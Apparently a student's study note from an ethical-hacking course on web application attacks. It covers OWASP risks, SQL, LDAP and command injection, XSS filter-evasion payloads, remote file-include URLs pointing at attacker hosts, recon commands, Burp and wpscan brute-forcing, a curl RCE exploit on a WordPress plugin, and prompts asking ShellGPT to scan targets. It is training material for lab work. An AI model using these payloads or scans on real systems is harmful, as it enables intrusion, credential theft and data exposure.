2025-08-03 18:12

Status:

Tags:

# Hacking Web Applications (concepts)

### Web Application Threats
#### OWASP Top 10 Application Security Risks – 2021
-  A01 – Broken Access Control 
- A02 – Cryptographic Failures
- A03 – Injection 
-  A04 – Insecure Design
-  A05 – Security Misconfiguration
-  A06 – Vulnerable and Outdated Components
- A07 – Identification and Authentication Failures
-  A08 – Software and Data Integrity Failures
-  A09 – Security Logging and Monitoring Failures
-  A10 – Server-Side Request Forgery (SSRF)

### Web Application Attacks 
- The following are various web application attacks: 

| **Attack Name**                  | **Attack Name**                    |
| -------------------------------- | ---------------------------------- |
| RC4 NOMORE Attack                | Same-Site Attack                   |
| Pass-the-Cookie Attack           | SQL Injection                      |
| Command Injection                | LDAP Injection                     |
| Cross-Site Scripting (XSS)       | Buffer Overflow                    |
| Business Logic Bypass Attack     | Web-based Timing Attacks           |
| CAPTCHA Attacks                  | Platform Exploits                  |
| XML External Entity (XXE) Attack | Unvalidated Redirects and Forwards |
| Magecart Attack                  | Cross-Site Request Forgery (CSRF)  |
| Cookie/Session Poisoning         | Insecure Deserialization           |
| Watering Hole Attack             | Denial-of-Service (DoS)            |
| Web Service Attacks              | Injecting an SSRF Payload          |
| Cross-Site Port Attack (XSPA)    | DNS Rebinding Attack               |
| H2C Smuggling Attack             | Clickjacking Attack                |
| JavaScript Hijacking             | Cross-Site WebSocket Hijacking     |
| Obfuscation Application          | Network Access Attacks             |
| DMZ Protocol Attacks             | MarioNet Attack                    |
#### Directory Traversal 
EXample:
The following example uses “../” to go back to several directories and obtain a file containing the backup of a web application:
- ``http://www.targetsite.com/../../../sitebackup.zip``
information:
- ``http://www.targetsite.com/../../../../etc/passwd``
- Let us consider another example in which an attacker tries to access files located outside a web publishing directory using directory traversal:
- ``http://www.certifiedhacker.com/process.aspx?page=../../../../some dir/some file
- ``http://www.certifiedhacker.com/../../../../some dir/some file``
![[Pasted image 20250803182843.png]]

#### Hidden Field Manipulation Attack 
Example A particular mobile phone might be offered for $1000 on an e-commerce website, but the hacker, by altering some of the hidden text in its price field, purchases it for only $10. Such attacks result in severe losses for website owners, even though they might be using the latest anti-virus software, firewalls, IDS, and so on to protect their networks from attacks. Besides financial losses, the owners can also lose their market credibility. An example of such code is given below: `<form method="post" action="page.aspx"> <input type="hidden" name=“PRICE" value=“200.00">
``Product name: <input type="text" name=“product” value=“Certifiedhacker Shirt"><br>``
``product price: 200.00"><br>
``<input type="submit" value="submit"> </form>``
- 1. Open the html page within an HTML editor. 2. Locate the hiddenfield (e.g. "<type=hidden name=price value=200.00>"). 3. Modify its content to a different value (e.g. "<type=hidden name=price value=2.00>"). 4. Save the html file locally and browse it. 5. Click the Buy button to perform electronic shoplifting via hidden manipulation.

#### Pass-the-Cookie Attack
For example, Mozilla Firefox saves all cookies inside a local SQLite database that attackers may acquire using tools such as firefox_creds. If the captured cookie is a session cookie, the attacker can use malware to implant their own session while browsing the web application. Attackers can also use mimikatz to extract encrypted cookies.

![[Pasted image 20250805131225.png]]


#### Same-Site Attack
 - Same-site attacks, also known as related-domain attacks, occur when an attacker targets a subdomain of a trusted organization and attempts to redirect users to an attacker-controlled web page
- Familiar domains such as .edu, .com, and .org contain several perimeters that make it easy for attackers to capture unused or misconfigured subdomains sharing the legitimate site’s top-level domains (TLDs)
-  These TLDs help attackers in hijacking the legitimate website to create dangling records using extended TLDs (eTLDs) 
![[Pasted image 20250805223346.png]]

#### SQL Injection Attacks 
SQL injection attacks use a series of malicious SQL queries or SQL statements to directly manipulate the database. Applications often use SQL statements to authenticate users, validate roles and access levels, store and retrieve information for the application and user, and link to other data sources. SQL injection attacks work because the application does not properly validate the input before passing it to an SQL statement. For example, consider the following SQL statement: SELECT 
	* ``FROM tablename WHERE UserID= 2302`` 
* becomes the following with a simple SQL injection attack:
	* ``SELECT * FROM tablename WHERE UserID= 2302 OR 1=1 The expression “OR 1=1”``
* evaluates to the value “TRUE,” often allowing the enumeration of all user ID values from the database. An attacker uses a vulnerable web application to bypass normal security measures and obtain direct access to valuable data. Attackers carry out SQL injection attacks from the web browser’s address bar, form fields, queries, searches, and so on. SQL injection attacks allow attackers to 
-  Log into the application without supplying valid credentials 
- Perform queries against data in the database, often even data to which the application would not normally have access
- Modify database contents or drop the database altogether 
- Use the trust relationships established between the web application components to access other databases
![[Pasted image 20250805224053.png]]

#### Command Injection Attacks
Command injection flaws allow attackers to pass malicious code to different systems via web applications. The attacks include calls to an operating system over system calls, use of external programs over shell commands, and calls to backend databases over SQL. Scripts in Perl, Python, and other languages execute and insert poorly designed web applications. If a web application uses any type of interpreter, attackers insert malicious code to inflict damage.

▪ Shell Injection
-  An attacker tries to craft an input string to gain shell access to a web server 
- Shell injection functions include system(), StartProcess(), java.lang.Runtime.exec(), System.Diagnostics.Process.Start(), and similar APIs
HTML Embedding 
-  This type of attack is used to deface websites virtually. Using this attack, an attacker adds extra HTML-based content to the vulnerable web application
- In an HTML embedding attack, the user input to a web script is placed into the output HTML without being checked for HTML code or scripting
File Injection 
- The attacker exploits this vulnerability and injects malicious code into system files
	- http://www.certifiedhacker.com/vulnerable.php?COLOR=http://evil/exploit?
Command Injection Example 
- An attacker enters the following malicious code (account number) with a new password. www.certifiedhacker.com/banner.gif||newpassword||1036|60|468
#### File Injection Attack
A file injection attack is a technique used to exploit “dynamic file include” mechanisms in web applications. File injection attacks enable attackers to exploit vulnerable scripts on the server to use a remote file instead of a presumably trusted file from the local file system. It occurs when a user is allowed to supply input for the include command dynamically, which is not properly validated before processing. When a user provides input, the web application passes it into “file include” commands. Most web application frameworks support file inclusion. 

attacker enters a URL that redirects the application to the location of the malicious file. While referring to the file without proper validation, the application executes the file script by calling specific procedures. Web applications are vulnerable to file injection attacks if the referred files are relayed using elements from HTTP requests. PHP is particularly vulnerable to these attacks because of the extensive use of “file includes” in PHP programming and default server configurations.

If the application ends with a php extension, and if a user requests it, then the application interprets it as php script and executes it. This allows an attacker to perform arbitrary commands. Consider the following client code running in a browser:

``<form method="get"> <select name=“DRINK"> <option value=“pepsi">pepsi</option> <option value=“coke">coke</option> </select> <input type="submit"> </form> Vulnerable PHP code: <?php $drink = ‘coke'; if (isset( $_GET[‘DRINK'] ) ) $drink = $_GET[‘DRINK']; require( $drink . '.php' );
?>``
Exploit code: http://www.certifiedhacker.com/orders.php?DRINK=http://jasoneval.com/exploit?


#### LDAP Injection Attacks 
LDAP Directory Services store and organize information based on its attributes. The information is hierarchically organized as a tree of directory entries. The Lightweight Directory Access Protocol (LDAP) is based on the client-server model, and clients can search the directory entries using filters.

 an attacker enters a valid username "certifiedhacker" and injects certifiedhacker)(&)), then the URL string becomes (&(USER=certifiedhacker)(&))(PASS=blah)). The LDAP server processes only the first filter; only the query (&(USER=certifiedhacker)(&)) is processed. This query is always true, and the attacker logs into the system without a valid password.

#### Cross-Site Scripting (XSS) Attacks 

![[Pasted image 20250806121504.png]]
##### XSS Attack in Comment Field
for example 
- ```“<script>alert ("Hello World") </script>“ ``

-  Encoding Characters
o A few or all of the characters of HTML elements can be written using ASCII codes to evade filters that search for strings such as` <javascript>: 
- ``<a href= “&#106;javascript:alert(‘XSS Successful’)”> Click Here!</a>
o Hexadecimal encoding can be used to bypass filters that search for HTML elements by scanning for &# along with numeric characters: 
- ``<a href=”&#6A;javascript:alert(document.cookie)”> Click Here!</a>
o Base64 encoding can be used to cover the tracks of attack code; it pops up an alert with “Successful XSS”:
- ``<body onload=”eval(atob(‘U3VjY2Vzc2Z1bCBYU1M=’))”>
o The embedded character elements are from numbers 1–7, avoiding initial zeros. Therefore, any composition of zero padding is allowed:
- ``<a href=”&#x6A;javascript&#0000058&#0000097lert(‘Successful XSS’)”> Click Here!</a>``
 XSS payloads can be concealed using character codes:
- ``<iframe src=# onmouseclick=alert(String.fromCharCode(88,83,83))></iframe>``
 Embedding Whitespaces
Browsers allow convenient usage of whitespace characters while writing JavaScript or HTML code. Thus, attackers can easily evade filters by inserting non-printable characters.
o Tab spaces are avoided while processing the code; they can be invoked to split keywords. Consider this <img> tag: 
- ``<img src=”java script:al ert (‘Successful XSS’)”>
o You can also encode the tab spaces: 
- ``<img src=”java&#x09;script:al&#x09;ert(‘Successful XSS’)”>
o Similarly, carriage return and newline characters are not considered during processing; thus, attackers can also encode these characters in between: 
- ``<a href =”jav&#x0A;a Script:&#x0A;ale&#x0Drt; (‘Successful XSS’)”>Visit xyz.com</a>
 Manipulating Tags
  XSS filter evasion can also be performed by manipulating tags and skipping attributes.
o When the filter inspects the script and deletes certain tags (mostly `<script>`), placing them within other tags can leave legitimate code after they are deleted: - 
- ``<scr<script>ipt>document.write(“Successful XSS”)</scr<script>ipt>
o Attributes and tags can be separated by supplying a slash that helps in bypassing whitespace restrictions in value insertion:
- ``<img/src=”popup.jpg”onload=&#x6A;avascript:eval(alert(‘Successful&#3 2XSS’))>
o Attackers also exploit browser interpretations and abnormal tag inputs to bypass filters. The following example shows how to skip the `<href>` tag: 
- ``<a onmousedown=alert(document.cookie)> visit xyz.com</a>

#### XML External Entity (XXE) Attack 
![[Pasted image 20250806122540.png]]

### Web Application Hacking Methodology 
![[Pasted image 20250806123345.png]]

#### Footprint Web Infrastructure
 #####  Whois Lookup
 -  Whois lookup tools allow you to gather information about a domain with the help of DNS and Whois queries. They provide information about the IP address of the web server and DNS names.  
- Use the following tools to perform Whois lookup: 
- Netcraft 
- Whois Lookup
- Batch IP Converter  Whois Domain Lookup 
-  Whois 
-  Whois Lookup

##### DNS Interrogation
Use the following tools to perform DNS interrogation: 
- DNSRecon (https://github.com) 
- DNS Records (https://www.nslookup.io) 
- Domain Dossier (https://centralops.net) 
- DNSdumpster.com

##### Server Discovery: Banner Grabbing
using telnet 
- `` telnet moviescope.com 80 ``
- ``GET / /HTTP/1.0 ``
 Grabbing Banners from SSL Services
- commands
	- ``OpenSSL``
	- `` s_client –host <target website> -port 443 ``
	- `` GET/HTTP/1.0 ``

##### Tools used for Ports and service discovery
using nmap 
- ``nmap -T -A -v -PE -PA 22,25,80,3389 google.com ``

##### Detecting Web App Firewalls and Proxies on Target Site
 - Detecting Proxies 
	 - using traceroute 
-  Detecting Web Application Firewalls
	- WAFW00F
	- `` wafw00f <target web site>
WAF Detection with AI
Example #1: ▪ “Check if the target url www.certifiedhacker.com has a web application firewall”
- command 
	- `` nmap -p 80,443 --script http-waf-detect --script-args http-waf-detect.aggro,http-waf-detect.detectBodyChanges www.certifiedhacker.com ``
Example #2: ▪ “Check if the target url www.certifiedhacker.com is protected with a web application firewall using wafwoof”
- command 
	- ``wafwoof http://www.certifiedhacker.com``
##### Hidden Content Discovery
 Web Spidering/Crawling A web spider (also known as web crawler or web robot) is a program or automated script that browses websites in a methodical manner to collect specific information such as employee names and email addresses. Attackers then use the collected information to perform footprinting and social engineering attacks. Web spidering fails if the target website has the robots.txt file in its root directory with a listing of directories to prevent crawling.
 -  OWASP Zed Attack Proxy 
 -  Web Data Extractor Pro (http://www.webextractor.com) 
 - Burp Suite (https://portswigger.net) 
 - WebScarab (https://owasp.org) 
 - Mozenda Agent Builder (https://www.mozenda.com) 
 - Octoparse (https://www.octoparse.com) 
 - Giant Web Crawl (https://80legs.com)

##### Detect Load Balancers
Organizations use load balancers to distribute their web server load across multiple servers and thus increase the productivity and reliability of web applications. In general, there are two types of load balancers, namely DNS load balancers (layer 4 load balancers) and HTTP load balancers (layer 7 load balancers). 

-  Using host command 
	- `` host <target website> ``
-  Using dig command
	- `` dig <target domain>
-  Using load balancing detector (lbd)
	- ``lbd <target domain> ``

##### Detecting Web App Technologies
- Wappalyzer 
- BuiltWith
##### WebSockets Enumeration
While footprinting web infrastructure, attackers try to enumerate the WebSockets on the target site to identify the running WebSocket servers. Tools such as STEWS (Security Testing and Enumeration of WebSockets) help attackers accomplish this. 
- STEWS
	- command 
		- `` cd home/attacker/STEWS/fingerprint ``
		- ``python3 STEWS-fingerprint.py -1 -k -u <Target URL> ``

### Analyze Web Applications
####  Gathering the Wordlist from the Target Website
using cewl
 - ``cewl https://www.certifiedhacker.com``
##### Metadata Extraction Tools 
using  ExifTool 
##### Web Updates Monitoring Tools
-  WebSite-Watcher
#### Website Mirroring
 Website Mirroring Tool: 
 - HTTrack Web Site Copier 
Website Mirroring with AI
- ''Mirror the target website certifiedhacker.com”
- command 
	- ``wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://certifiedhacker.com ``
Website Mirroring using Httrack with AI
- “Mirror the target website https://certifiedhacker.com with httrack on desktop”
	- command 
	- ``httrack https://certifiedhacker.com mirror ``
### Identify Server-Side Technologies 
using 
-   httprint 
- WhatWeb
	- command 
		- ``whatweb -v www.moviescope.com ``

using AI
- "Launch whatweb on the target website www.moviescope.com to perform website footprinting. Run a verbose scan and print the output. Save the results in file whatweb_log.txt.”
- command 
	- ``whatweb -v www.moviescope.com | tee whatweb_log.txt ``

### Identify Server-Side Functionality

### Identify Files and Directories
using  Gobuster
- Gobuster
	- command 
		- ``gobuster dir -u <target URL> -w common.txt `` for status code `` -s 200
using nmap 
 -  Nmap 
	 - command 
		 - ``nmap -sV --script=http-enum <target domain or IP> ``
- dirb 
	- command 
		- ``dirb <target domain >`` 
### Identify Web Application Vulnerabilities 
- using tools like 
	-  Vega
	-  WPScan Vulnerability Database (https://wpscan.com) 
	- Codename SCNR (https://ecsypno.com) 
	- AppSpider (https://www.rapid7.com) 
	- Uniscan (https://github.com) 
	- N-Stalker (https://www.nstalker.com) 
- nikto 
	- command 
		- ``nikto -h <domain>``
- nmap 
	- command 
		- ``nmap --script vuln www.moviescope.com ``
Identify Web Application Vulnerabilities with AI
1. “Perform the Vulnerability scan on the target url www.moviescope.com”
	- command  
		- ``nikto -h www.moviescope.com  ``
2.  “Perform the Vulnerability scan on the target url www.moviescope.com using nmap”
	- command 
		- ``nmap --script vuln www.moviescope.com ``
3. "Install Sn1per tool and scan the target url www.moviescope.com for web vulnerabilities and save result in file scan3.txt”
	- command 
		- ``sudo apt-get update A sudo apt-get install -y git && git clone https://github.com/1N3/Sniper g
		- it && cd Sniper && sudo bash install.sh && sniper -t www.moviescope.com -w scan3.txt ``

### Bypass Client - side Cont rols

### Attack Authentication Mechanism
- Username Enumeration 
der the following example. An attacker tries to enumerate the username and password of “Rini Matthews” on wordpress.com. In the first attempt, the attacker tries to login as “rini.matthews,” which results in the login failure message “invalid email or username.”
##### Password Attacks: Password Brute-forcing
- brupsuit 
Cookie Exploitation Tools: 
- OWASP Zed Attack Proxy
#### Attacking Session Tokens Handling Mechanism: Manipulating WebSocket Traffic
 - Step 1: Open Burp Suite and enable interception.
  -  Step 2: Browse any application that uses WebSockets for communication. 
  -  Step 3: Go to Proxy → WebSockets history to view the entries.
-  Step 4: Right-click on the entry to manipulate and choose “Send to Repeater”. 
- Step 5: Now, click on Repeater. In the History panel, you can see all the messages transmitted over the WebSocket connection.
- Step 6: Click on the pencil icon next to the WebSocket URL, select WebSocket from the Select WebSocket window and click on Clone to clone a connection
-  Step 7: Manipulate the raw request as required and click on the Connect button. Then, Burp Suite will attempt to carry out the configured handshake.
-  Step 8: Click on the pencil icon again to see if the new WebSocket connection was successfully established and can be used to send new messages.
-   Step 9: After the new connection is established, in the main window click on Send to transmit the manipulated WebSocket communication to the server



### Authorization Attack: Cookie Parameter Tampering
refer booklet 2107

### Create and Run Custom Scripts to Automate Web Application Hacking Tasks With AI
1. “Create and run a custom script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com”
2. “create and run a custom python script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com”
3. “create and run a custom python script which will run web application footprinting tasks to gather information and then use this information to perform vulnerability scanning on target url www.certifiedhacker.com”

### WEB API 
#### Web API Hacking Methodology
Hacking a web API involves the following phases: 
- Identify the target 
- Detect security standards 
- Identify the attack surface 
- Launch attacks
#### Identify the Target
Before hacking an API, an attacker first needs to identify the target and its perimeter:
-  HTTP: APIs such as SOAP and REST mostly use the HTTP protocol for communicating API-based messages. The HTTP protocol is a text-based protocol where the header information is transmitted in a readable format. For example, consider the following HTTP Request and Response headers: 
![[Pasted image 20250806135420.png]]


### Web Application Fuzz Testing with AI
1.  “Fuzz the target url www.moviescope.com using Wfuzz tool”


# Lab 1: Footprint the Web Infrastructure
## Task 1: Perform Web Application Reconnaissance using Nmap and Telnet
- perform nmap scan 
	- ``nmap -A -v -T4 www.moviescope.com `` 
- Telnet 
	- `` telnet www.moviescopecom``
		- ``GET / HTTP/1.0``

## Task 2: Perform Web Spidering using OWASP ZAP
- In terminal type ``zaproxy``
	- click on automated Scan and attack
	- see the active scan 
	- see the spider tab  for information


## Task 3: Perform Web Application Vulnerability Scanning using SmartScanner
- open windows 11 and lunch SmartScanner 
	- see the report 
# Lab 2: Perform Web Application Attacks
## Task 1: Perform a Brute-force Attack using Burp Suite
- make sure it enables ``wampserver64``
- open parrot 
1. enable proxy in browser as ``127.0.0.1`` and make sure turn on interceptor 
2. open browser and go ``http://10.10.1.22:8080/CEH/Wp-login.php?``
	- login as ``admin:password``  
3. go under history and look for contains as admin and password 
	- send it intruder 
	- and select the admin and password and add 5 
4. select cluster bomb attack 
	-  under payloads add payload set 1 and set 2 
	- add from desktop/webapplication/wordlist/user and password 
	- start attack 
	- you will get ``admin:qwert@123``
- or using word press ( fastest way )
	- wpscan
1. Brute-Force word press 
	- ``wpscan --url http://TARGET-IP/wordpress/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt ``
	- ``wpscan --url http://www.cehorg. com:8080/CEH/wp-login? --usernames adam --passwords password. txt``
## Task 2: Perform Remote Code Execution (RCE) Attack
- so open windows 22 server and turn on wampserver64
1. login ti wordpress  ``http://10.10.1.22:8080/CEH/wp-login.php?``
	- using  ``admin`` and ``qwerty@123``
2. go to plugins -> installed plugins  -> User post Gallery 
3. open parrot 
	-   go to ``https://wpscan.com/`` and login as admin 
	- click the **Get Started**
	- 1. click **Start for free** button under **Researcher** section.
	- and get API tokens 
4. do word press scan using 
	- command 
		- ``wpscan --url http://10.10.1.22:8080/CEH --api-token [API]`` (make sure you set it active)
	-   In the **Plugin(s) Identified** section, within the context of the **wp-upg** plugin, an **Unauthenticated Remote Code Execution (RCE)** vulnerability has been detected
5. exploiting the **RCE** vulnerability present in the **wp-upg** plugin.
	-  `` curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL' ``
		- plugin name wp-upg


# Lab 3: Detect Web Application Vulnerabilities using Various Web Application Security Tools
## Task 1: Detect Web Application Vulnerabilities using Wapiti Web Application Security Scanner
- open parrot 
1. open 
	- ``cd wapiti``
	- run python virtual env
		- ``python3 -m venv wapiti3`` 
2. to activate env
	 - ``. wapiti3/bin/activate ``
3.  to install wapiti web application security scanner
	- ``pip install .``
4. to perform scan  
	- ``wapiti -u https://www.certifiedhacker.com``
 5. to view the report 
	 - ``cd /root/.wapiti/generated_report/ ``


# Lab 4: Perform Web Application Hacking using AI
## Task 1: Perform Web Application Hacking using ShellGPT

- ``sgpt --shell "Check if the target url https://www.certifiedhacker.com is protected with web application firewall using wafwoof"``
 -   To detect load balancers using ShellGPT run 
	 - ``sgpt --shell "Use load balancing detector on target domain yahoo.com."``
- To identify server side technologies using ShellGPT run 
	- ``sgpt --chat HWA --shell "Launch whatweb on the target website www.moviescope.com to perform website footprinting. Run a verbose scan and print the output. Save the results in file whatweb_log.txt."``

## if files are located in the “C:
login to the  application > set security level low > choose command execution type below commands: | dir "C:\xxxx\www\xx\\xx" > there are 3 Cipher.txt files. | type 
"C:\Wamp64\www\xxxx\xxxx\xxxx\Cipher1.txt" | type 
"C:\xxxx\www\xxxx\xxCertified\Cipher2.txt" | type 
"C:\xxxx\www\xxxx\xxxx\Certified\Cipher3.txt" 
Use online cyber-chief application 

#### others 
- TO find the **meta-author** 
```bash
 curl -s http://targetwebsite | grep -i author
```
- cat in windows 
	- ``type filename``
### References
- [ ]  do manual of AI and then individual tools to perform  





sfc /scannow  
  
chkdsk C: /f /r